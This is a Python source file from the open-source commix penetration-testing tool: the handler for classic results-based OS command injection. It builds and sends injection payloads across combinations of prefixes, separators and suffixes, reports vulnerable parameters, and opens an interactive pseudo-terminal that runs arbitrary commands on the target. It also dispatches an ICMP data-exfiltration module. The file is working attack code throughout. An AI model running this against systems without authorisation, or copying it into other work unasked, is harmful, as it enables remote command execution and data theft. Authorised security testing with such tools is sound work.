#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix (@commixproject) tool.
 Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation,either version 3 of the License,or
 (at your option) any later version.
 
 For more see the file 'readme/COPYING' for copying permission.
"""

import re
import os
import sys
import time
import string
import random
import base64
import urllib
import urllib2

from src.utils import menu
from src.utils import colors
from src.utils import settings

from src.core.requests import headers
from src.core.requests import parameters

from src.core.injections.results_based.techniques.classic import cb_injector
from src.core.injections.results_based.techniques.classic import cb_payloads
from src.core.injections.results_based.techniques.classic import cb_enumeration

"""
  The "classic" technique on Result-based OS Command Injection.
"""

#-------------------------------------------------------
# The "icmp exfiltration" injection technique handler.
#-------------------------------------------------------
def icmp_exfiltration_handler(url,http_request_method):
  
  # You need to have root privileges to run this script
  if os.geteuid() != 0:
    print colors.BGRED + "\n(x) Error:  You need to have root privileges to run this option.\n" + colors.RESET
    sys.exit(0)
    
  if http_request_method == "GET":
    # Check if its not specified the 'INJECT_HERE' tag
    url = parameters.do_GET_check(url)
    
    # Define the vulnerable parameter
    vuln_parameter = parameters.vuln_GET_param(url)
    request_data = vuln_parameter

  else:
    parameter = menu.options.data
    parameter = urllib2.unquote(parameter)
    
    # Check if its not specified the 'INJECT_HERE' tag
    parameter = parameters.do_POST_check(parameter)
    
    # Define the vulnerable parameter
    vuln_parameter = parameters.vuln_POST_param(parameter,url)
    request_data = vuln_parameter
    
  ip_data = menu.options.ip_icmp_data
  
  # Load the module ICMP_Exfiltration
  try:
    from src.core.modules import ICMP_Exfiltration
    
  except ImportError as e:
    print colors.BGRED + "(x) Error:",e
    print colors.RESET
    sys.exit(1)
    
  technique = "ICMP exfiltration technique"
  sys.stdout.write( colors.BOLD + "(*) Testing the "+ technique + "... \n" + colors.RESET)
  sys.stdout.flush()
  
  ip_src =  re.findall(r"ip_src=(.*),",ip_data)
  ip_src = ''.join(ip_src)
  
  ip_dst =  re.findall(r"ip_dst=(.*)",ip_data)
  ip_dst = ''.join(ip_dst)
  
  ICMP_Exfiltration.exploitation(ip_dst,ip_src,url,http_request_method,request_data)



#---------------------------------------------
# The "classic" injection technique handler.
#---------------------------------------------
def cb_injection_handler(url,delay,filename,http_request_method):
  
  counter = 0
  vp_flag = True
  no_result = True
  is_encoded= False
  injection_type = "Results-based Command Injection"
  technique = "classic injection technique"
      
  sys.stdout.write( colors.BOLD + "(*) Testing the "+ technique + "... " + colors.RESET)
  sys.stdout.flush()
  
  # Print the findings to log file.
  output_file = open(filename + ".txt","a")
  output_file.write("\n---")
  output_file.write("\n(+) Type : " + injection_type)
  output_file.write("\n(+) Technique : " + technique.title())
  output_file.close()
  
  for whitespace in settings.WHITESPACES:
    for prefix in settings.PREFIXES:
      for suffix in settings.SUFFIXES:
	for separator in settings.SEPARATORS:
	  
	  # Check for bad combination of prefix and separator
	  combination = prefix + separator
	  if combination in settings.JUNK_COMBINATION:
	    prefix = ""

	  # Change TAG on every request to prevent false-positive resutls.
	  TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6))  
	  
	  # Check if defined "--base64" option.
	  if menu.options.base64_trick == True:
	    B64_ENC_TAG = base64.b64encode(TAG)
	    B64_DEC_TRICK = settings.B64_DEC_TRICK
	  else:
	    B64_ENC_TAG = TAG
	    B64_DEC_TRICK = ""
	    
	  try:
	    # Classic decision payload (check if host is vulnerable).
	    payload = cb_payloads.decision(separator,TAG,B64_ENC_TAG,B64_DEC_TRICK)
	    
	    # Check if defined "--prefix" option.
	    if menu.options.prefix:
	      prefix = menu.options.prefix
	      payload = prefix + payload
	    else:
	      payload = prefix + payload
	      
	    # Check if defined "--suffix" option.
	    if menu.options.suffix:
	      suffix = menu.options.suffix
	      payload = payload + suffix
	    else:
	      payload = payload + suffix

	    if separator == " " :
	      payload = re.sub(" ","%20",payload)
	    else:
	      payload = re.sub(" ",whitespace,payload)

	    # Check if defined "--verbose" option.
	    if menu.options.verbose:
	      sys.stdout.write("\n" + colors.GREY + payload + colors.RESET)
	      
	    # Check if target host is vulnerable.
	    response,vuln_parameter = cb_injector.injection_test(payload,http_request_method,url)

	    # if need page reload
	    if menu.options.url_reload:
	      time.sleep(delay)
	      response = urllib.urlopen(url)
	      
	    # Evaluate test results.
	    shell = cb_injector.injection_test_results(response,TAG)
	    
	  except:
	    continue
	  
	  # Yaw, got shellz! 
	  # Do some magic tricks!
	  if shell:
	    found = True
	    no_result = False
	    
	    if http_request_method == "GET":
	      # Print the findings to log file
	      if vp_flag == True:
		output_file = open(filename + ".txt","a")
		output_file.write("\n(+) Parameter : " + vuln_parameter + " (" + http_request_method + ")")
		output_file.write("\n---\n")
		vp_flag = False
		output_file.close()
		
	      counter = counter + 1
	      output_file = open(filename + ".txt","a")
	      output_file.write("  ("+str(counter)+") Payload : "+ re.sub("%20"," ",payload) + "\n")
	      output_file.close()
	      
	      # Print the findings to terminal.
	      print colors.BOLD + "\n(!) The ("+ http_request_method + ") '" + vuln_parameter +"' parameter is vulnerable to "+ injection_type +"."+ colors.RESET
	      print "  (+) Type : "+ colors.YELLOW + colors.BOLD + injection_type + colors.RESET + ""
	      print "  (+) Technique : "+ colors.YELLOW + colors.BOLD + technique.title() + colors.RESET + ""
	      print "  (+) Parameter : "+ colors.YELLOW + colors.BOLD + vuln_parameter + colors.RESET + ""
	      print "  (+) Payload : "+ colors.YELLOW + colors.BOLD + re.sub("%20"," ",payload) + colors.RESET

	    else :
	      # Print the findings to log file
	      if vp_flag == True:
		output_file = open(filename + ".txt","a")
		output_file.write("\n(+) Parameter : " + vuln_parameter + " (" + http_request_method + ")")
		output_file.write("\n---\n")
		vp_flag = False
		output_file.close()
		
	      counter = counter + 1
	      output_file = open(filename + ".txt","a")
	      output_file.write("  ("+str(counter)+") Payload : "+ re.sub("%20"," ",payload) + "\n")
	      output_file.close()
	      
	      # Print the findings to terminal.
	      print colors.BOLD + "\n(!) The ("+ http_request_method + ") '" + vuln_parameter +"' parameter is vulnerable to "+ injection_type +"."+ colors.RESET
	      print "  (+) Type : "+ colors.YELLOW + colors.BOLD + injection_type + colors.RESET + ""
	      print "  (+) Technique : "+ colors.YELLOW + colors.BOLD + technique.title() + colors.RESET + ""
	      print "  (+) Parameter : "+ colors.YELLOW + colors.BOLD + vuln_parameter + colors.RESET + ""
	      print "  (+) Payload : "+ colors.YELLOW + colors.BOLD + re.sub("%20"," ",payload) + colors.RESET
	      
	    # Check for any enumeration options.
	    cb_enumeration.do_check(separator,TAG,prefix,suffix,whitespace,http_request_method,url,vuln_parameter)
	    
	    # Pseudo-Terminal shell
	    gotshell = raw_input("\n(*) Do you want a Pseudo-Terminal shell? [Y/n] > ").lower()
	    if gotshell in settings.CHOISE_YES:
	      print ""
	      print "Pseudo-Terminal (type 'q' or use <Ctrl-C> to quit)"
	      while True:
		try:
		  cmd = raw_input("Shell > ")
		  if cmd == "q":
		    sys.exit(0)
		    
		  else:
		    # The main command injection exploitation.
		    response = cb_injector.injection(separator,TAG,cmd,prefix,suffix,whitespace,http_request_method,url,vuln_parameter)
		    
		    # if need page reload
		    if menu.options.url_reload:
		      time.sleep(delay)
		      response = urllib.urlopen(url)
		      
		    # Command execution results.
		    shell = cb_injector.injection_results(response,TAG)
		    if shell:
		      shell = "".join(str(p) for p in shell)
		      print "\n" + colors.GREEN + colors.BOLD + shell + colors.RESET + "\n"

		except KeyboardInterrupt: 
		  print ""
		  sys.exit(0)
	      
	    else:
	      print "(*) Continue testing the "+ technique +"... "
	      pass

  if no_result == True:
    if menu.options.verbose == False:
      print "[" + colors.RED + " FAILED "+colors.RESET+"]"
  
    else:
      print ""
    
    return False
  
  else :
    print ""
    
    
    
def exploitation(url,delay,filename,http_request_method):
  
  # Use the ICMP Exfiltration technique
  if menu.options.ip_icmp_data:
    icmp_exfiltration_handler(url,http_request_method)
    
  else:
    cb_injection_handler(url,delay,filename,http_request_method)

